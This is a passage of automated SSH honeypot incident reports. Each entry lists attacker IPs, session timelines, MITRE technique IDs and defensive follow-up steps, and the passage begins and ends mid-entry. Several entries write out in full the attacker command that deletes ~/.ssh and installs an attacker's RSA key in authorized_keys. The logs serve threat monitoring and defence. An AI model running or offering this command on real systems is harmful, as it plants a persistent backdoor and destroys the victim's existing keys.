| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:14:46` | `cowrie.session.connect` |
| `2026-04-18 09:14:46` | `cowrie.client.version` |
| `2026-04-18 09:14:46` | `cowrie.client.kex` |
| `2026-04-18 09:14:47` | `cowrie.login.success` |
| `2026-04-18 09:14:48` | `cowrie.session.params` |
| `2026-04-18 09:14:48` | `cowrie.command.input` |
| `2026-04-18 09:14:48` | `cowrie.command.failed` |
| `2026-04-18 09:14:48` | `cowrie.log.closed` |
| `2026-04-18 09:14:49` | `cowrie.session.params` |
| `2026-04-18 09:14:49` | `cowrie.command.input` |
| `2026-04-18 09:14:49` | `cowrie.session.file_download` |
| `2026-04-18 09:14:49` | `cowrie.log.closed` |
| `2026-04-18 09:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b47d3396645f

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:14 |
| **Last Seen** | 2026-04-18 09:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:14:51` | `cowrie.session.connect` |
| `2026-04-18 09:14:51` | `cowrie.client.version` |
| `2026-04-18 09:14:52` | `cowrie.client.kex` |
| `2026-04-18 09:14:53` | `cowrie.login.success` |
| `2026-04-18 09:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c661b10d7af3

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:18 |
| **Last Seen** | 2026-04-18 09:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:18:08` | `cowrie.session.connect` |
| `2026-04-18 09:18:08` | `cowrie.client.version` |
| `2026-04-18 09:18:08` | `cowrie.client.kex` |
| `2026-04-18 09:18:09` | `cowrie.login.success` |
| `2026-04-18 09:18:09` | `cowrie.session.params` |
| `2026-04-18 09:18:09` | `cowrie.command.input` |
| `2026-04-18 09:18:09` | `cowrie.command.failed` |
| `2026-04-18 09:18:09` | `cowrie.log.closed` |
| `2026-04-18 09:18:10` | `cowrie.session.params` |
| `2026-04-18 09:18:10` | `cowrie.command.input` |
| `2026-04-18 09:18:10` | `cowrie.session.file_download` |
| `2026-04-18 09:18:10` | `cowrie.log.closed` |
| `2026-04-18 09:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3d864f6cbd2

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:18 |
| **Last Seen** | 2026-04-18 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:18:13` | `cowrie.session.connect` |
| `2026-04-18 09:18:13` | `cowrie.client.version` |
| `2026-04-18 09:18:13` | `cowrie.client.kex` |
| `2026-04-18 09:18:14` | `cowrie.login.success` |
| `2026-04-18 09:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7df261812e2

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:19 |
| **Last Seen** | 2026-04-18 09:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:19:01` | `cowrie.session.connect` |
| `2026-04-18 09:19:01` | `cowrie.client.version` |
| `2026-04-18 09:19:01` | `cowrie.client.kex` |
| `2026-04-18 09:19:01` | `cowrie.login.success` |
| `2026-04-18 09:19:02` | `cowrie.session.params` |
| `2026-04-18 09:19:02` | `cowrie.command.input` |
| `2026-04-18 09:19:02` | `cowrie.command.failed` |
| `2026-04-18 09:19:02` | `cowrie.log.closed` |
| `2026-04-18 09:19:02` | `cowrie.session.params` |
| `2026-04-18 09:19:02` | `cowrie.command.input` |
| `2026-04-18 09:19:02` | `cowrie.session.file_download` |
| `2026-04-18 09:19:02` | `cowrie.log.closed` |
| `2026-04-18 09:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af3a01418d11

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:19 |
| **Last Seen** | 2026-04-18 09:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:19:04` | `cowrie.session.connect` |
| `2026-04-18 09:19:04` | `cowrie.client.version` |
| `2026-04-18 09:19:04` | `cowrie.client.kex` |
| `2026-04-18 09:19:04` | `cowrie.login.success` |
| `2026-04-18 09:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc222ad1ca5

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:19 |
| **Last Seen** | 2026-04-18 09:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:19:44` | `cowrie.session.connect` |
| `2026-04-18 09:19:44` | `cowrie.client.version` |
| `2026-04-18 09:19:44` | `cowrie.client.kex` |
| `2026-04-18 09:19:45` | `cowrie.login.success` |
| `2026-04-18 09:19:45` | `cowrie.session.params` |
| `2026-04-18 09:19:45` | `cowrie.command.input` |
| `2026-04-18 09:19:45` | `cowrie.command.failed` |
| `2026-04-18 09:19:46` | `cowrie.log.closed` |
| `2026-04-18 09:19:46` | `cowrie.session.params` |
| `2026-04-18 09:19:46` | `cowrie.command.input` |
| `2026-04-18 09:19:46` | `cowrie.session.file_download` |
| `2026-04-18 09:19:46` | `cowrie.log.closed` |
| `2026-04-18 09:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d5a88869684

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:19 |
| **Last Seen** | 2026-04-18 09:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:19:49` | `cowrie.session.connect` |
| `2026-04-18 09:19:49` | `cowrie.client.version` |
| `2026-04-18 09:19:49` | `cowrie.client.kex` |
| `2026-04-18 09:19:50` | `cowrie.login.success` |
| `2026-04-18 09:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b574d2fb55

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:20 |
| **Last Seen** | 2026-04-18 09:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:20:34` | `cowrie.session.connect` |
| `2026-04-18 09:20:34` | `cowrie.client.version` |
| `2026-04-18 09:20:34` | `cowrie.client.kex` |
| `2026-04-18 09:20:35` | `cowrie.login.success` |
| `2026-04-18 09:20:35` | `cowrie.session.params` |
| `2026-04-18 09:20:35` | `cowrie.command.input` |
| `2026-04-18 09:20:35` | `cowrie.command.failed` |
| `2026-04-18 09:20:35` | `cowrie.log.closed` |
| `2026-04-18 09:20:35` | `cowrie.session.params` |
| `2026-04-18 09:20:35` | `cowrie.command.input` |
| `2026-04-18 09:20:35` | `cowrie.session.file_download` |
| `2026-04-18 09:20:35` | `cowrie.log.closed` |
| `2026-04-18 09:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06fcca3ef48c

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:20 |
| **Last Seen** | 2026-04-18 09:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:20:40` | `cowrie.session.connect` |
| `2026-04-18 09:20:40` | `cowrie.client.version` |
| `2026-04-18 09:20:40` | `cowrie.client.kex` |
| `2026-04-18 09:20:40` | `cowrie.login.success` |
| `2026-04-18 09:20:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25e5d9b89e85

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:24 |
| **Last Seen** | 2026-04-18 09:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:24:58` | `cowrie.session.connect` |
| `2026-04-18 09:24:58` | `cowrie.client.version` |
| `2026-04-18 09:24:58` | `cowrie.client.kex` |
| `2026-04-18 09:24:58` | `cowrie.login.success` |
| `2026-04-18 09:24:58` | `cowrie.session.params` |
| `2026-04-18 09:24:58` | `cowrie.command.input` |
| `2026-04-18 09:24:58` | `cowrie.command.failed` |
| `2026-04-18 09:24:58` | `cowrie.log.closed` |
| `2026-04-18 09:24:58` | `cowrie.session.params` |
| `2026-04-18 09:24:58` | `cowrie.command.input` |
| `2026-04-18 09:24:59` | `cowrie.session.file_download` |
| `2026-04-18 09:24:59` | `cowrie.log.closed` |
| `2026-04-18 09:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62d445c63d23

| Field | Detail |
|---|---|
| **Source IP** | `103.243.26[.]174` |
| **First Seen** | 2026-04-18 09:25 |
| **Last Seen** | 2026-04-18 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:25:00` | `cowrie.session.connect` |
| `2026-04-18 09:25:00` | `cowrie.client.version` |
| `2026-04-18 09:25:00` | `cowrie.client.kex` |
| `2026-04-18 09:25:01` | `cowrie.login.success` |
| `2026-04-18 09:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.26[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.243.26[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-945b701958d9

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:25 |
| **Last Seen** | 2026-04-18 09:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:25:06` | `cowrie.session.connect` |
| `2026-04-18 09:25:06` | `cowrie.client.version` |
| `2026-04-18 09:25:06` | `cowrie.client.kex` |
| `2026-04-18 09:25:07` | `cowrie.login.success` |
| `2026-04-18 09:25:07` | `cowrie.session.params` |
| `2026-04-18 09:25:07` | `cowrie.command.input` |
| `2026-04-18 09:25:07` | `cowrie.command.failed` |
| `2026-04-18 09:25:07` | `cowrie.log.closed` |
| `2026-04-18 09:25:07` | `cowrie.session.params` |
| `2026-04-18 09:25:07` | `cowrie.command.input` |
| `2026-04-18 09:25:07` | `cowrie.session.file_download` |
| `2026-04-18 09:25:07` | `cowrie.log.closed` |
| `2026-04-18 09:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b69e56c74b9a

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:25 |
| **Last Seen** | 2026-04-18 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:25:09` | `cowrie.session.connect` |
| `2026-04-18 09:25:09` | `cowrie.client.version` |
| `2026-04-18 09:25:09` | `cowrie.client.kex` |
| `2026-04-18 09:25:09` | `cowrie.login.success` |
| `2026-04-18 09:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-722c6cb5bc14

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:27 |
| **Last Seen** | 2026-04-18 09:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:27:21` | `cowrie.session.connect` |
| `2026-04-18 09:27:21` | `cowrie.client.version` |
| `2026-04-18 09:27:21` | `cowrie.client.kex` |
| `2026-04-18 09:27:21` | `cowrie.login.success` |
| `2026-04-18 09:27:22` | `cowrie.session.params` |
| `2026-04-18 09:27:22` | `cowrie.command.input` |
| `2026-04-18 09:27:22` | `cowrie.command.failed` |
| `2026-04-18 09:27:22` | `cowrie.log.closed` |
| `2026-04-18 09:27:22` | `cowrie.session.params` |
| `2026-04-18 09:27:22` | `cowrie.command.input` |
| `2026-04-18 09:27:22` | `cowrie.session.file_download` |
| `2026-04-18 09:27:22` | `cowrie.log.closed` |
| `2026-04-18 09:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dce3dea0c474

| Field | Detail |
|---|---|
| **Source IP** | `103.215.80[.]173` |
| **First Seen** | 2026-04-18 09:27 |
| **Last Seen** | 2026-04-18 09:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:27:28` | `cowrie.session.connect` |
| `2026-04-18 09:27:28` | `cowrie.client.version` |
| `2026-04-18 09:27:28` | `cowrie.client.kex` |
| `2026-04-18 09:27:28` | `cowrie.login.success` |
| `2026-04-18 09:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.215.80[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.215.80[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ca743ce337

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-04-18 09:27 |
| **Last Seen** | 2026-04-18 09:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 09:27:48` | `cowrie.session.connect` |
| `2026-04-18 09:27:48` | `cowrie.client.version` |
| `2026-04-18 09:27:49` | `cowrie.client.kex` |
| `2026-04-18 09:27:50` | `cowrie.login.success` |
| `2026-04-18 09:27:50` | `cowrie.session.params` |
| `2026-04-18 09:27:50` | `cowrie.command.input` |
